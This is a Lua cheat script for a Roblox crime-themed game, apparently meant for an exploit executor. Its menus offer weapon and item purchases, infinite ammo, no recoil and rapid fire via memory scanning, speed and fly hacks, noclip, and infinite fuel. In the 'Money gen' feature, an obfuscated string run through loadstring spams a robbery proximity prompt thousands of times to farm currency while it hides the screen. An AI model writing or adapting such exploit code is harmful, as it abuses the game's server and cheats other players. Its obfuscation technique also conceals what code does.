local cgs = CreateCard(pma, "Gun store")

local g_list = {
    "--[ PISTOLS ]--",
    "Hellcat XD | $7,120", "G24 Competition | $3,750", "G20 Grip SilverBack | $6,799",
    "Kimber 45. Flash | $2,950", "PSA ROCK 5.7 | $2,750", "G41 MOS Kriss | $7,650", "Ruger LCP | $800",
    "G27 Extended | $4,350", "Glock 36 | $3,865", "P80 Mos Beam | $4,950", "SS MR920P | $4,350",
    "P80 Extended | $4,750", "G48 PerformanceTrigger | $4,350", "Engraved Colt .38 Super | $6,850",
    "Canik MC9 Prime | $4,999", "38. Smith&Wesson | $750", "G43X | $3,450", "G22 Compensated | $7,850",
    "FNXBeam | $4,799", "S&W M2.0 Clearmag | $4,355", "Matchmaster 1911 | $3,100", "Springfield Echelon | $3,470",
    "Springfield Hellcat | $6,549", "G19XPSAGrip | $5,350", "Glock-17 | $1,350", "G40VectMag | $4,950",
    "Python | $600", "G31C | $6,499", "Glock19x Extended | $4,450", "G26 | $1,250", "G17Gen5Vect | $3,850",
    "G23Gen4 Extended | $3,650",
    "--[ RIFLES ]--",
    "AR556 GreenTip | $13,500", "308ARP | $9,475", "KelTec Sub2000 | $11,500", "Scoped 762 Micro | $12,150",
    "Vepr 12 Defender | $9,850", "Tan Arp | $8,150", "556Rifle | $10,420", "SIGMCX | $9,250", "AK74 | $9,300",
    "Micro KS47 | $7,350", "223Mini | $8,950", "300BlackOut | $7,350", "Kriss Alpine Gen II | $7,890",
    "M16A2 | $7,500", "BlackMiniDrac | $8,750", "GFR AR10 | $12,899", "ZPAP 762 | $9,500",
    "SLIMEBALL762 | $10,645", "AR-223 | $10,200", "Colt 723 | $12,450", "BCM4 | $12,360", "PLR-16 | $8,500",
    "--[ MELEES ]--",
    "Pocket Knife | $55", "lucille | $1,299", "Kitchen Knife | $85",
    "--[ CUSTOMS ]--",
    "G2C Flash Drum | $8,800", "P320XDrumFlash | $8,215", "G22Drum | $7,515", "FDEPLR100Rnd | $12,550",
    "223 Drum | $13,000", "G27 Drum | $7,650", "50rnd Gen5 | $5,899", "NAK9Drum | $14,600", "G17L Drum | $8,500",
    "G20DrumFlash | $7,549", "PSA ARP 100rnd | $15,500", "100rnd N4 | $14,500", "G19DrumFlash | $8,900",
    "G19Gen5Drum | $7,500", "ARP 100 Rnd | $13,500", "PLR-16Drum | $10,500"
}

local gunOpts = {}
for _, name in ipairs(g_list) do
    table.insert(gunOpts, { Name = name, Value = name })
end

local gunDrop
gunDrop = CreateDropdown(cgs, "Select Gun", gunOpts, nil, 1, function(val)
    if val then
        if string.find(val, "%-%-%[") then
            task.spawn(function()
                task.wait(0.5)
                gunDrop.Refresh(gunOpts, "Select Gun...")
            end)
        else
            local selectedGun = string.split(val, " | ")[1]
            local Event = game:GetService("ReplicatedStorage"):FindFirstChild("Events")
            if Event and Event:FindFirstChild("ServerEvent") then
                Event.ServerEvent:FireServer("BuyItemTool", selectedGun)
            end
            task.spawn(function()
                task.wait(0.5)
                gunDrop.Refresh(gunOpts, "Select Gun...")
            end)
        end
    end
end, "Select Gun...")

local WM = _G.EXE.GUN_MODS
CreateToggle(cgs, "Infinite Ammo", false, nil, function(v)
    WM.INF_AMMO = v
end)
CreateToggle(cgs, "No Recoil", false, nil, function(v)
    WM.NO_RECOIL = v
end)
CreateToggle(cgs, "No Spread", false, nil, function(v)
    WM.NO_SPREAD = v
end)
CreateToggle(cgs, "Rapid Fire", false, nil, function(v)
    WM.RAPID_FIRE = v
end)

local CACHED_GUN_DATA = nil
LPLR.CharacterAdded:Connect(function() CACHED_GUN_DATA = nil end)

task.spawn(function()
    while task.wait(0.5) do
        if WM.INF_AMMO or WM.NO_RECOIL or WM.NO_SPREAD or WM.RAPID_FIRE then
            pcall(function()
                local char = LPLR.Character
                local hasTool = char and char:FindFirstChildWhichIsA("Tool")

                if not hasTool then
                    CACHED_GUN_DATA = nil
                    return
                end

                if CACHED_GUN_DATA and type(CACHED_GUN_DATA) == "table" and rawget(CACHED_GUN_DATA, "_currentGunMetadata") then
                    local meta = CACHED_GUN_DATA._currentGunMetadata
                    if WM.INF_AMMO then meta.InMag = math.huge end
                    if WM.NO_RECOIL and meta.Recoil and type(meta.Recoil) == "table" then
                        meta.Recoil.Magnitude, meta.Recoil.Roughness, meta.Recoil.PositionInfluence = 0, 0, 0
                    end
                    if WM.NO_SPREAD then meta.BulletSpreadValue = 0 end
                    if WM.RAPID_FIRE then
                        meta.FireMode, meta.FireRate = "Auto", 0.08
                    end
                    if meta.JamChance then meta.JamChance = 0 end
                else
                    for _, v in ipairs(getgc(true)) do
                        if type(v) == "table" and rawget(v, "_currentGunMetadata") then
                            CACHED_GUN_DATA = v
                            break
                        end
                    end
                end
            end)
        end
    end
end)

local csi = CreateCard(pma, "Store items")
local store_items = {
    "--[ AMMOS ]--",
    "DoubleDrum", "Slugs", "9mm", "5.56", "7.62x39mm", "Bullets", "Drum",
    "--[ STORE ITEMS ]--",
    "Black Balaclava", "Blue Balaclava", "Red Balaclava", "White Balaclava",
    "Drank", "Spraypaint", "Cubes", "B&R Ski", "Blue Ski", "White Pink Ski",
    "Sub", "Chips", "Candy", "Pizza", "Soda", "Water"
}

local itemOpts = {}
for _, itm in ipairs(store_items) do
    table.insert(itemOpts, { Name = itm, Value = itm })
end

local SelectedItem = nil
local SelectedQty = 1

local itemDrop
itemDrop = CreateDropdown(csi, "Choose Item", itemOpts, nil, 1, function(val)
    if val then
        if val:find("%-%-%[") then
            SelectedItem = nil
            itemDrop.Refresh(itemOpts, "Choose Item...")
        else
            SelectedItem = val
            itemDrop.Refresh(itemOpts, "Choose Item: " .. val)
        end
    end
end, "Choose Item...")

local qtyOpts = {}
for i = 1, 20 do
    table.insert(qtyOpts, { Name = tostring(i), Value = i })
end

local qtyDrop
qtyDrop = CreateDropdown(csi, "Qty", qtyOpts, nil, 1, function(val)
    if val then
        SelectedQty = val
        qtyDrop.Refresh(qtyOpts, "Qty: " .. tostring(val))
    end
end, "Qty: 1")

local purchaseBtn = CreateCardButton(csi, "Purchase")
purchaseBtn.MouseButton1Click:Connect(function()
    if SelectedItem then
        local Event = game:GetService("ReplicatedStorage"):FindFirstChild("Events")
        if Event and Event:FindFirstChild("ServerEvent") then
            Event.ServerEvent:FireServer("BuyItemTool", SelectedItem, nil, SelectedQty)
        end
    end
end)

local cact = CreateCard(pma, "Actions")
local GEN_RUNNING = false
local btnAction1 = CreateCardButton(cact, "Money gen")
local tlblAction1 = btnAction1:FindFirstChildWhichIsA("TextLabel")

btnAction1.MouseButton1Click:Connect(function()
    if GEN_RUNNING then return end

    local function cleanM(s) return tonumber((s:gsub("%D", ""))) or 0 end
    local curMoneyStr = ""
    pcall(function() curMoneyStr = LPLR.PlayerGui.MainScreen.Profile.CashAmount.Text end)

    if cleanM(curMoneyStr) >= 5000000 then
        Notify("Money Gen", "You have $5M+. Spend it before using again!", 5)
        return
    end

    GEN_RUNNING = true
    if tlblAction1 then tlblAction1.Text = "Money gen: RUNNING" end

    local startPos = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") and
        LPLR.Character.HumanoidRootPart.CFrame
    if not startPos then
        GEN_RUNNING = false; if tlblAction1 then tlblAction1.Text = "Money gen" end; return
    end

    local oldVols = {}
    local function mute(v)
        if v:IsA("Sound") and not oldVols[v] then
            oldVols[v] = v.Volume
            v.Volume = 0
        end
    end
    local muteConn1 = game.DescendantAdded:Connect(mute)
    for _, v in pairs(game:GetDescendants()) do pcall(mute, v) end

    local CORE = game:GetService("CoreGui")
    local success, _ = pcall(function() return CORE.Name end)
    local OVRParent = success and CORE or LPLR.PlayerGui

    local OVR = Instance.new("ScreenGui", OVRParent)
    OVR.DisplayOrder = 999999
    OVR.IgnoreGuiInset = true

    local BLACK = Instance.new("Frame", OVR)
    BLACK.Size = UDim2.new(1, 0, 1, 0)
    BLACK.BackgroundColor3 = Color3.new(0, 0, 0)
    BLACK.ZIndex = 1

    local IMG = Instance.new("ImageLabel", OVR)
    IMG.Size = UDim2.new(1, 0, 1, 0)
    IMG.Image = "rbxassetid://83114994796030"
    IMG.BackgroundTransparency = 1
    IMG.ZIndex = 2
    IMG.ScaleType = Enum.ScaleType.Crop

    task.wait(1)

    SafeTP(Vector3.new(1, 92, -68))
    task.wait(0.5)

    local _O1 = {
        "\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10",
        "\32\32\32\32\108\111\99\97\108\32\69\118\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\69\118\101\110\116\115\46\83\101\114\118\101\114\69\118\101\110\116\10",
        "\32\32\32\32\69\118\101\110\116\58\70\105\114\101\83\101\114\118\101\114\40\34\82\111\98\78\80\67\34\44\32\34\71\105\111\39\115\32\83\104\111\112\34\41\10",
        "\101\110\100\41\10",
        "\108\111\99\97\108\32\97\99\116\105\118\97\116\101\100\32\61\32\102\97\108\115\101\10",
        "\108\111\99\97\108\32\115\84\105\109\101\32\61\32\116\105\99\107\40\41\10",
        "\119\104\105\108\101\32\116\105\99\107\40\41\32\45\32\115\84\105\109\101\32\60\32\49\49\32\100\111\10",
        "\32\32\32\32\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10",
        "\32\32\32\32\32\32\32\32\108\111\99\97\108\32\98\97\103\32\61\32\119\111\114\107\115\112\97\99\101\46\77\97\112\46\78\80\67\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\71\105\111\39\115\32\83\104\111\112\34\41\10",
        "\32\32\32\32\32\32\32\32\98\97\103\32\61\32\98\97\103\32\97\110\100\32\98\97\103\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\66\97\103\80\111\115\105\116\105\111\110\34\41\10",
        "\32\32\32\32\32\32\32\32\98\97\103\32\61\32\98\97\103\32\97\110\100\32\98\97\103\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\77\111\110\101\121\66\97\103\34\41\10",
        "\32\32\32\32\32\32\32\32\108\111\99\97\108\32\112\114\111\109\112\116\32\61\32\98\97\103\32\97\110\100\32\98\97\103\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\114\111\120\105\109\105\116\121\80\114\111\109\112\116\34\41\10",
        "\32\32\32\32\32\32\32\32\105\102\32\112\114\111\109\112\116\32\116\104\101\110\10",
        "\32\32\32\32\32\32\32\32\32\32\32\32\97\99\116\105\118\97\116\101\100\32\61\32\116\114\117\101\10",
        "\32\32\32\32\32\32\32\32\32\32\32\32\102\111\114\32\95\32\61\32\49\44\32\51\53\48\48\32\100\111\10",
        "\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\116\97\115\107\46\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10",
        "\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\112\99\97\108\108\40\102\105\114\101\112\114\111\120\105\109\105\116\121\112\114\111\109\112\116\44\32\112\114\111\109\112\116\41\10",
        "\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\41\10",
        "\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10",
        "\32\32\32\32\32\32\32\32\101\110\100\10",
        "\32\32\32\32\101\110\100\41\10",
        "\32\32\32\32\105\102\32\97\99\116\105\118\97\116\101\100\32\116\104\101\110\32\98\114\101\97\107\32\101\110\100\10",
        "\32\32\32\32\116\97\115\107\46\119\97\105\116\40\48\46\50\41\10",
        "\101\110\100\10",
        "\114\101\116\117\114\110\32\97\99\116\105\118\97\116\101\100"
    }
    local _O2 = ""
    for _i = 1, #_O1 do _O2 = _O2 .. _O1[_i] end
    local activated = getfenv()["\108\111\97\100\115\116\114\105\110\103"](_O2)()

    if activated then
        Notify("MONEY GEN", "successful. Collecting money...", 4)
        task.wait(8)
    else
        Notify("MONEY GEN", "Failed to start money generation!", 4)
    end

    SafeTP(startPos.Position)
    if LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart") then
        LPLR.Character.HumanoidRootPart.CFrame = startPos
    end
    task.wait(2)
    OVR:Destroy()
    if muteConn1 then muteConn1:Disconnect() end
    pcall(function()
        for s, v in pairs(oldVols) do if s.Parent then s.Volume = v end end
    end)
    if tlblAction1 then tlblAction1.Text = "Money gen" end
    GEN_RUNNING = false
end)

local btnAction2 = CreateCardButton(cact, "Server hop")
btnAction2.MouseButton1Click:Connect(function()
    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local PlaceId = game.PlaceId
    local serversApi = "https://games.roblox.com/v1/games/" ..
        tostring(PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"

    local function getServers(cursor)
        local url = serversApi
        if cursor then url = url .. "&cursor=" .. cursor end
        local success, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if success and result and result.data then
            return result
        end
        return nil
    end

    local serverToHop = nil
    local cursor = nil
    while not serverToHop do
        local data = getServers(cursor)
        if data and data.data then
            for _, v in ipairs(data.data) do
                if type(v) == "table" and v.id ~= game.JobId and v.playing and v.playing < v.maxPlayers - 1 then
                    serverToHop = v.id
                    break
                end
            end
            cursor = data.nextPageCursor
            if not cursor then break end
        else
            break
        end
    end

    if serverToHop then
        TeleportService:TeleportToPlaceInstance(PlaceId, serverToHop, game.Players.LocalPlayer)
    else
        TeleportService:Teleport(PlaceId, game.Players.LocalPlayer)
    end
end)


local pmo = CreateTab("Misc", "Misc Features")
local cmv = CreateCard(pmo, "Movement")

local speedBypassConnection
CreateToggle(cmv, "WalkSpeed", false, nil, function(v)
    local char = LPLR.Character
    local humanoid = char and char:FindFirstChild("Humanoid")
    if v then
        if not speedBypassConnection then
            local isMobile = uis.TouchEnabled and not uis.KeyboardEnabled
            speedBypassConnection = RS.Heartbeat:Connect(function(dt)
                local char = LPLR.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local humanoid = char and char:FindFirstChild("Humanoid")
                if not hrp or not humanoid then return end

                humanoid.AutoRotate = false
                local speed = walkBypassSpeed
                local moveDir
                local camera = workspace.CurrentCamera

                if isMobile then
                    local move = humanoid.MoveDirection
                    if move.Magnitude > 0 then
                        local camMove = camera.CFrame:VectorToWorldSpace(move)
                        moveDir = Vector3.new(camMove.X, 0, camMove.Z).Unit
                    end
                else
                    local camCF = camera.CFrame
                    local look = Vector3.new(camCF.LookVector.X, 0, camCF.LookVector.Z).Unit
                    local right = Vector3.new(camCF.RightVector.X, 0, camCF.RightVector.Z).Unit

                    local inputDir = Vector3.new(
                        (uis:IsKeyDown(Enum.KeyCode.D) and 1 or 0) -
                        (uis:IsKeyDown(Enum.KeyCode.A) and 1 or 0),
                        0,
                        (uis:IsKeyDown(Enum.KeyCode.W) and 1 or 0) -
                        (uis:IsKeyDown(Enum.KeyCode.S) and 1 or 0)
                    )

                    if inputDir.Magnitude > 0 then
                        moveDir = (right * inputDir.X) + (look * inputDir.Z)
                    end
                end

                if moveDir and moveDir.Magnitude > 0 then
                    local newPos = hrp.Position + (moveDir * speed * dt)
                    local rayParams = RaycastParams.new()
                    rayParams.FilterDescendantsInstances = { char }
                    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
                    local result = workspace:Raycast(newPos + Vector3.new(0, 10, 0),
                        Vector3.new(0, -25, 0), rayParams)
                    if result then
                        newPos = Vector3.new(newPos.X, result.Position.Y + 3, newPos.Z)
                    end
                    hrp.CFrame = CFrame.new(newPos, newPos + moveDir)
                    hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
                end

                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = false
                    end
                end
            end)
        end
    else
        if speedBypassConnection then
            speedBypassConnection:Disconnect()
            speedBypassConnection = nil
            if humanoid then humanoid.AutoRotate = true end
            if char then
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then
                        if p.Name == "Head" or p.Name == "Torso" or p.Name == "UpperTorso" or p.Name == "LowerTorso" or p.Name == "HumanoidRootPart" then
                            p.CanCollide = true
                        else
                            p.CanCollide = false
                        end
                    end
                end
            end
        end
    end
end)

CreateSlider(cmv, "Speed Value", 16, 200, 50, nil, function(v)
    walkBypassSpeed = v
end)

local flyConnection
local flyPos
CreateToggle(cmv, "Player Fly", false, nil, function(v)
    local char = LPLR.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    if not root or not humanoid then return end

    if v then
        flyPos = root.Position
        humanoid.PlatformStand = true

        flyConnection = RS.Heartbeat:Connect(function()
            local cam = workspace.CurrentCamera
            local cf = cam.CFrame.Rotation
            local dir = cf:VectorToObjectSpace(humanoid.MoveDirection * flySpeed)

            local direction
            if dir.Magnitude == 0 then
                direction = Vector3.new(0, 0, 0)
            else
                direction = cf:VectorToWorldSpace(
                    Vector3.new(dir.X, 0, dir.Z).Unit * dir.Magnitude
                )
            end

            flyPos = flyPos + direction
            root.CFrame = CFrame.new(
                flyPos,
                cam.CFrame.Position + (flyPos - cam.CFrame.Position) * 2
            )

            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)

            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
    else
        if flyConnection then
            flyConnection:Disconnect()
            flyConnection = nil
        end
        humanoid.PlatformStand = false
        if LPLR.Character then
            for _, p in ipairs(LPLR.Character:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = true end
            end
        end
    end
end)

CreateSlider(cmv, "Fly Speed", 10, 200, 50, nil, function(v)
    flySpeed = v
end)

CreateToggle(cmv, "Inf Stamina")

local isCarFlying = false
local flyBV, flyBG
local carFlyConnection

local function get_vic()
    local char = LPLR.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
        return hum.SeatPart.Parent, hum.SeatPart
    end
    return nil, nil
end

local function cleanupCarFly()
    if flyBV then
        flyBV:Destroy(); flyBV = nil
    end
    if flyBG then
        flyBG:Destroy(); flyBG = nil
    end
    if carFlyConnection then
        carFlyConnection:Disconnect(); carFlyConnection = nil
    end
    isCarFlying = false
end

CreateToggle(cmv, "Car Fly", false, nil, function(v)
    isCarFlying = v
    if not v then
        cleanupCarFly()
        return
    end

    local vic, seat = get_vic()
    if not vic or not seat then
        isCarFlying = false
        return
    end

    local root = vic.PrimaryPart or seat

    flyBV = Instance.new("BodyVelocity")
    flyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    flyBV.Velocity = Vector3.new(0, 0, 0)
    flyBV.Parent = root

    flyBG = Instance.new("BodyGyro")
    flyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    flyBG.CFrame = root.CFrame
    flyBG.P = 5000
    flyBG.Parent = root

    carFlyConnection = RS.Heartbeat:Connect(function()
        local vic, seat = get_vic()
        if not vic or not isCarFlying then
            cleanupCarFly()
            return
        end

        local root = vic.PrimaryPart or seat
        local camCF = workspace.CurrentCamera.CFrame
        local moveDir = Vector3.new(0, 0, 0)

        if uis:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camCF.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camCF.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camCF.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + camCF.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
        if uis:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir = moveDir - Vector3.new(0, 1, 0) end

        if moveDir.Magnitude > 0 then
            flyBV.Velocity = moveDir.Unit * carFlySpeed
        else
            flyBV.Velocity = Vector3.new(0, 0, 0)
        end

        flyBG.CFrame = camCF
    end)
end)

CreateSlider(cmv, "Car Fly Speed", 50, 500, 150, nil, function(v)
    carFlySpeed = v
end)

local noclipConnection
CreateToggle(cmv, "Noclip", false, nil, function(v)
    if v then
        noclipConnection = RS.Stepped:Connect(function()
            local char = LPLR.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end)
    else
        if noclipConnection then
            noclipConnection:Disconnect()
            noclipConnection = nil
        end
    end
end)

local AntiFlingConnection
CreateToggle(cmv, "Anti Fling", false, nil, function(v)
    if v then
        AntiFlingConnection = RS.Stepped:Connect(function()
            for _, player in ipairs(pls:GetPlayers()) do
                if player ~= LPLR and player.Character then
                    for _, part in ipairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end
        end)
    else
        if AntiFlingConnection then
            AntiFlingConnection:Disconnect()
            AntiFlingConnection = nil
        end
    end
end)



local V_EV = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("VehicleEvent")

local function GET_MY_CAR()
    local cars = workspace:FindFirstChild("Cars")
    if not cars then return nil end
    local myId = tostring(LPLR.UserId)
    local myName = LPLR.Name
    for _, car in pairs(cars:GetChildren()) do
        if car:IsA("Model") then
            local owner = car:GetAttribute("OwnerId") or car:GetAttribute("Owner") or car:GetAttribute("OwnerID")
            if tostring(owner) == myId or tostring(owner) == myName then return car end
            if car.Name:find(myId) or car.Name:find(myName) then return car end
            local ov = car:FindFirstChild("Owner") or car:FindFirstChild("OwnerId") or car:FindFirstChild("Creator")
            if ov and (tostring(ov.Value) == myId or tostring(ov.Value) == myName) then return car end
            for _, obj in ipairs(car:GetDescendants()) do
                if obj:IsA("StringValue") or obj:IsA("NumberValue") or obj:IsA("IntValue") then
                    if tostring(obj.Value) == myId or tostring(obj.Value) == myName then return car end
                end
            end
        end
    end
    return nil
end

local ccs = CreateCard(pmo, "Car Spawner")

CreateDropdown(ccs, "Car Tools",
    { { Name = "Flip Car", Value = "Flip Car" }, { Name = "Tp to Car", Value = "Tp to Car" } },
    nil, 1, function(val)
        if val == "Flip Car" then
            local char = LPLR.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local veh = nil
            if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
                veh = hum.SeatPart.Parent
            else
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local rayParams = RaycastParams.new()
                    rayParams.FilterType = Enum.RaycastFilterType.Include
                    local carsFolder = workspace:FindFirstChild("Cars")
                    if carsFolder then
                        rayParams.FilterDescendantsInstances = { carsFolder }
                        local ray = workspace:Raycast(hrp.Position, Vector3.new(0, -6, 0), rayParams)
                        if ray and ray.Instance then
                            veh = ray.Instance:FindFirstAncestorOfClass("Model")
                        end
                    end
                    if not veh and carsFolder then
                        for _, c in pairs(carsFolder:GetChildren()) do
                            if c:IsA("Model") and c:FindFirstChild("DriveSeat") then
                                if (hrp.Position - c.DriveSeat.Position).Magnitude < 7 then
                                    veh = c
                                    break
                                end
                            end
                        end
                    end
                end
            end
            if veh and veh:IsDescendantOf(workspace:FindFirstChild("Cars") or workspace) then
                local target = veh:FindFirstChild("PrimaryPart") or veh:FindFirstChild("DriveSeat") or
                    veh:FindFirstChildWhichIsA("BasePart", true)
                if target then
                    veh:PivotTo(CFrame.new(target.Position + Vector3.new(0, 6, 0)) * CFrame.Angles(0, 0, 0))
                    Notify("Car Spawner", "Successfully flipped nearest car!", 2)
                end
            else
                Notify("Car Spawner", "No car found to flip!", 2)
            end
        elseif val == "Tp to Car" then
            local car = GET_MY_CAR()
            if car then
                LPLR.Character:PivotTo(car:GetPivot() + Vector3.new(0, 5, 0))
                Notify("Car Spawner", "Teleported to your car!", 2)
            else
                Notify("Car Spawner", "You don't have a spawned car!", 2)
            end
        end
    end)

local cbMyCars = CreateDropdown(ccs, "My Cars", { { Name = "None", Value = "None" } }, nil, 1, function(v)
    if v == "None" then return end
    Notify("Car Spawner", "Attempting to spawn: " .. v, 2)
    local park
    local parks = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("VehicleParks") and
        workspace.Map.VehicleParks:FindFirstChild("Spawns")
    if parks then
        local dist = math.huge
        local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, slot in ipairs(parks:GetChildren()) do
                if slot:IsA("BasePart") then
                    local d = (hrp.Position - slot.Position).Magnitude
                    if d < dist then
                        dist = d
                        park = slot
                    end
                end
            end
        end
    end
    if park then
        local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = park.CFrame + Vector3.new(0, 3, 0)
            task.wait(0.5)
            V_EV:FireServer("SpawnVehicle", v)
            return
        end
    end
    V_EV:FireServer("SpawnVehicle", v)
end)

task.spawn(function()
    local utility
    pcall(function()
        utility = require(game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("Utility"))
    end)
    while task.wait(5) do
        local names = {}
        if utility then
            pcall(function()
                local data = utility:GetClientData()
                if data and data.Cars then
                    for _, car in pairs(data.Cars) do
                        local n = (typeof(car) == "table" and (car.Name or car.VehicleName or car.Model)) or
                            tostring(car)
                        table.insert(names, n)
                    end
                end
            end)
        end
        if #names > 0 then
            table.sort(names)
            local options = {}
            for _, n in ipairs(names) do table.insert(options, { Name = n, Value = n }) end
            pcall(function()
                if cbMyCars and cbMyCars.Refresh then
                    cbMyCars.Refresh(options, "Select Car...")
                end
            end)
        end
    end
end)

local infFuelConnection
local togFuel = CreateToggle(ccs, "Infinite Fuel", false, nil, function(v)
    if v then
        infFuelConnection = RS.Heartbeat:Connect(function()
            local char = LPLR.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum and hum.SeatPart and hum.SeatPart.Name == "DriveSeat" then
                pcall(function()
                    local car = hum.SeatPart.Parent
                    local fuelRemote = game:GetService("ReplicatedStorage"):FindFirstChild("FuelRemotes")
                    if fuelRemote and fuelRemote:FindFirstChild("SetFuel") then
                        fuelRemote.SetFuel:FireServer(car, 999999)
                    end
                end)
            end
        end)
    else
        if infFuelConnection then
            infFuelConnection:Disconnect()
            infFuelConnection = nil
        end
    end
end)
togFuel.Keybind.Visible = true

local cdt = CreateCard(pmo, "Dropped Tools")
local autoScrapeConn
local togAutoColl = CreateToggle(cdt, "Auto collect Tools", false, nil, function(v)
    if v then
        autoScrapeConn = RS.Heartbeat:Connect(function()
            local hrp = LPLR.Character and LPLR.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                for _, folder in ipairs({ workspace, workspace:FindFirstChild("Slugs") }) do
                    if folder then
                        for _, item in ipairs(folder:GetChildren()) do
                            if item:IsA("Tool") and item:FindFirstChild("Handle") then
                                local handle = item.Handle
                                if handle:FindFirstChildWhichIsA("TouchTransmitter") then
                                    pcall(function()
                                        firetouchinterest(hrp, handle, 0)
                                        firetouchinterest(hrp, handle, 1)
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end)
    else
        if autoScrapeConn then
            autoScrapeConn:Disconnect()
            autoScrapeConn = nil
        end
    end
end)
togAutoColl.Keybind.Visible = true

local cDeal = CreateCard(pmo, "Car Dealer")
local sel_deal = ""
local ALL_CARS = {
    { "Dodge Charger SRT Hellcat", "79k" }, { "Porsche 911 GT3RS", "96k" }, { "Cadillac CTS-V", "125k" },
    { "Ford Mustang",              "78.5k" }, { "2011 Toyota Camry", "8.5k" }, { "Scat Pack", "82k" },
    { "Cadilac Escalade", "135k" }, { "64 Impala", "64.5k" }, { "Corvette", "95k" },
    { "Chevy 2500",       "40k" }, { "The Hawk", "112k" }, { "Mercedes AMG", "103k" },
    { "Range Rover", "73k" }, { "Urus", "257k" }, { "Lamborghini Veneno", "2.5m" },
    { "Mclaren",     "235k" }, { "Rolls Royce", "547k" }, { "BMW 330I", "49k" },
    { "Lexus LS400",    "9.8k" }, { "Chrysler 300 Hellcat", "45k" }, { "Chevrolet Tahoe", "63k" },
    { "WideBody Demon", "135k" }, { "GTR R35 Widebody", "235k" }, { "DirtBike", "800" },
    { "Harley Davidson Softail", "23k" }, { "Audi R8 Widebody", "245k" }, { "Kawasaki Ninja H2R", "34.6k" },
    { "Ford F-350",              "451k" }, { "BP Brabus B63 6x6", "Game Pass" }, { "1987 Buick Regal GNX", "345k" },
    { "Shelby GT500", "285k" }, { "Maybach S 650", "310k" }, { "2020TRX", "285k" },
    { "Benz CLS 53",  "185k" }, { "Camaro ZL1", "340k" }, { "Alfa Romeo", "295k" },
    { "Bugatti Vision", "3.5m" }, { "Sprinter Van", "55k" }, { "WideBody Supra", "650k" },
    { "GoKart",         "8.5k" }, { "CyberTruck", "445k" }, { "Lamborghini Huracan", "1.8m" },
    { "4 Wheeler",         "6.5k" }, { "RollsRoyce Cullinan", "850k" }, { "Mercedes Benz GLE53", "450k" },
    { "Aston Marton DBX3", "650k" }, { "Mini k Truck", "14k" }, { "Jeep Grand Cherokee srt-8", "46k" },
    { "M4 Comp",    "450k" }, { "Ferrari 812", "3.5m" }, { "Dodge Durango", "195k" },
    { "Chevy Donk", "265k" }, { "Dodge Charger SRT", "175k" }, { "G wagon", "2.8m" },
    { "2011 Lincoln Town Car",                 "32k" }, { "Lincoln Limousine", "210k" }, { "Infiniti G37", "160k" },
    { "2023 Corvette C8 Stingray Convertible", "548k" }, { "Kia 5K GT", "135k" }
}

local displayNames = {}
for _, car in ipairs(ALL_CARS) do
    table.insert(displayNames, { Name = car[1] .. " | " .. car[2], Value = car[1] })
end

local dCarDealer = CreateDropdown(cDeal, "Select Vehicle", displayNames, nil, 1, function(v)
    sel_deal = v
end)
